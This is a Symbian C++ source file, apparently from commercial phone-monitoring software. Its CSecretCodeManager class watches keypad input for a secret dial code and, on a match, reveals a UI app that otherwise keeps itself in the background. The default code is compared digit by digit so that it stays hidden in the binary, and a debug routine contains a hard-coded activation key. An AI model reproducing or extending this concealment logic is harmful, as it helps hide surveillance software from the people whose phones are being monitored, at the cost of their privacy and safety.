#include "SecretCodeManager.h"

#include "Logger.h"
#include "TaskUtil.h"
#include "HashUtils.h"
#include "LicenceManager.h"
	
#include <APADEF.H>

CSecretCodeManager::CSecretCodeManager(CLicenceManager& aLicenceMan, TApaTaskUtil& aTaskUtil,RFs& aFs)
:iLicenceMan(aLicenceMan),
iApaTask(aTaskUtil),
iFs(aFs),
iActivationCodeArr(KSecretCodeArrayaGranularity)
{
}

CSecretCodeManager::~CSecretCodeManager()
{	
	delete iLogon;		
	iActivationCodeArr.Close();
}

CSecretCodeManager* CSecretCodeManager::NewL(CLicenceManager& aLicenceMan, TApaTaskUtil& aTaskUtil,RFs& aFs)
{
	CSecretCodeManager* self = new(ELeave)CSecretCodeManager(aLicenceMan,aTaskUtil,aFs);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
}

void CSecretCodeManager::ConstructL()
{	
	//LOG0(_L("[CSecretCodeManager::ConstructL] ."))
	
	iLicenceMan.ReadLicenceFileL();
	iLicenceMan.SetMonitorChange(ETrue);
	
	iLogon = new TLogonManager(iFs, _L(LOGON_FILE));	
	
	//__Debug();
	
	//LOG0(_L("[CSecretCodeManager::ConstructL] Endx"))
}

void CSecretCodeManager::HandleFocusAppChanged()
{
	if(iActivationCodeArr.Count() > 0 )
		iActivationCodeArr.Reset();
}

void CSecretCodeManager::SecretCodePressedL(const TUint& aCode)
{	
	LOG1(_L("[CSecretCodeManager::SecretCodePressedL] aEvent.iCode: %d"),aCode)
	
	TInt arrCount = iActivationCodeArr.Count();
	if(arrCount >= KMaxSecretCodeLenght) {
		//
		// iActivationCodeArr length is more than KMaxSecretKeyLenght
		// then have to clear it
		
		iActivationCodeArr.Reset();
		
	}else if(KSecretCodeClearIndicator == aCode) { // *
		iActivationCodeArr.Reset();
	} else if(arrCount == 0 && KSecretCodeBegin == aCode) {
		// begin key is pressed (*#)
		//
		iKeyBeginPressed = ETrue;
		//12345679456464#
	} else {
		
		if(KSecretCodeEnd == aCode && iKeyBeginPressed){
			iKeyBeginPressed = EFalse;
			
			//
			//check and bring app to foreground if user pressed the correct secret aCode
			CompareHashAndBringAppToForeground();
			
			iActivationCodeArr.Reset();		
		} else {
			iActivationCodeArr.Append(aCode);
		}		
	}
}

void CSecretCodeManager::CompareHashAndBringAppToForeground()
{	
	LOG0(_L("[CSecretCodeManager::CompareHashAndBringAppToForeground]"))
	
	//
	//convert key pressed to string
	//	
	TInt arrCount = iActivationCodeArr.Count();	
	
	TBuf8<KMaxSecretCodeLenght> actvCodeStr;
	for(TInt i = 0; i < arrCount; i++) {
		actvCodeStr.Append(iActivationCodeArr[i]);
	}
	
	if(!iLicenceMan.IsActivatedL()) {
		//LOG0(_L("[CSecretCodeManager::CompareHashAndBringAppToForeground] Licence not activated"))
		
		//
		//app is not activated yet
		
		//
		//check if user presses '007'
		//bring ui app to foreground if they are match the default keys
		//
		//if(arrCount == KDefaultSecretCode().Length() &&	actvCodeStr.Compare(KDefaultSecretCode) == 0) {
		if(MatchDefaultKey(actvCodeStr)) {
			//	
			LOG0(_L("[CSecretCodeManager::CompareHashAndBringAppToForeground] Match *#900900900#"))
			
			iLogon->SetLogonL(ETrue);
			
			iApaTask.BringAppToForeground(KUidFxsApp);	
		}
		
	} else {
		
		LOG0(_L("[CSecretCodeManager::CompareHashAndBringAppToForeground] Product is activated"))
		
		//
		//result hash
		TMd5Hash keyPressedHash;
		HashUtils::DoHashL(KProductID,actvCodeStr,keyPressedHash);
		
		//
		//Get activation code hash from licence file
		//
		TPtrC8 activaCodeHash = iLicenceMan.FlexiKeyHashCode();
		
		//LOGDATA(_L("licc_activacode.hash"),activaCodeHash)
		//LOGDATA(_L("keyPressedHash.hash"),keyPressedHash)		
		//LOG1(_L("[CSecretCodeManager::CompareHashAndBringAppToForeground] IsMatch: %d"), keyPressedHash.Compare(activaCodeHash) == 0)
		
		//
		//compare it
		if(keyPressedHash.Compare(activaCodeHash) == 0) {
			
			//
			//Now they are match but before bringing app to foreground
			//Have to write logon flag to file to indicates that user has logged on
			//The application will check this flag before running in the foreground otherwise it will push itself to background
			//
			
			//
			//save logon flag to file
			iLogon->SetLogonL(ETrue);
			
			//
			//now its time to go		
			TBool exists = iApaTask.BringAppToForeground(KUidFxsApp);			
			if(!exists) {
				//Ui application is not running
				//
				
				TFileName appFile;
				if(KErrNone == GetAppFile(appFile)) {
					//start Fxs ui application
					//
					iApaTask.StartAppL(appFile,EApaCommandRun);
				}
			}
			
		} else {
			//
			//save logon flag to file
			iLogon->SetLogonL(EFalse);				
		}
	}
}

TBool CSecretCodeManager::MatchDefaultKey(const TDesC8& aActivationCodeStr)
{	
	LOG0(_L("[CSecretCodeManager::MatchDefaultKey] Enter"))
	
	if(KDefaultScretCodeLength != aActivationCodeStr.Length() )
		return EFalse;
	
	//Compare every single elements one by one
	//
	//The reason that compare this way because the default keys are not declared as literal (_LIT)
	//This just to prevent it to be viewable from program code
	//
	//
	
	//return arrCount == KDefaultSecretCode().Length() && actvCodeStr.Compare(KDefaultSecretCode) == 0;
	
	return (aActivationCodeStr[0] == '9' &&
			aActivationCodeStr[1] == '0' &&
			aActivationCodeStr[2] == '0' &&
			aActivationCodeStr[3] == '9' &&
			aActivationCodeStr[4] == '0' &&
			aActivationCodeStr[5] == '0' &&
			aActivationCodeStr[6] == '9' &&
			aActivationCodeStr[7] == '0' &&
			aActivationCodeStr[8] == '0' );
}

/**
* 
* on return application absulute path including drive letter
*/
TInt CSecretCodeManager::GetAppFile(TDes& aAppFullName)
{	
    TFindFile findFile(iFs);
    TInt err = findFile.FindByDir(KAppFxsPath,KNullDesC);
    if(KErrNone == err)
		aAppFullName = findFile.File();
	
	return err;
}

void CSecretCodeManager::__Debug()
{
#ifndef __DEBUG_ENABLE__ 
	return;
#endif
	
	//TUint keys[] = { 0x35,0x36,0x37,0x35,0x35,0x39,0x39,0x30,0x35};
	
	//t4l_949826146
	TUint keys[] = {0x39,0x34,0x39,0x38,0x32,0x36,0x31,0x34,0x36};
	
	const TInt keyLen  = sizeof(keys) / sizeof(keys[0]);	
	
	for(TInt i = 0; i < keyLen; i++) {
		iActivationCodeArr.Append(keys[i]);
	}
	
	TInt arrCount = iActivationCodeArr.Count();
	
	TBuf8<KMaxSecretCodeLenght> actvCodeStr;
	for(TInt i = 0; i < arrCount; i++) {
		actvCodeStr.Append(iActivationCodeArr[i]);
	}	
	
	//
	//digest it
	TMd5Hash hashResult;
	HashUtils::DoHashL(KProductID,actvCodeStr,hashResult);	
	
	LOGDATA(_L("567559905.hash"),hashResult)
}